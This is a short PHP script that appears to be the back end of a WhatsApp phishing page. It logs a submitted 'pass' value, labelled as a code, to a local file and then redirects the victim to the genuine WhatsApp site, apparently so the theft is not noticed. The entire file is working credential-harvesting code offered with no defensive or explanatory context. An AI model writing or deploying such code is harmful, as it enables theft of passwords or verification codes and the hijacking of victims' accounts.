<?php
file_put_contents("log.txt", "Kod: " . $pass = $_POST['pass'] . "\n\n", FILE_APPEND);
header('Location: https://www.whatsapp.com/?lang=en');
?>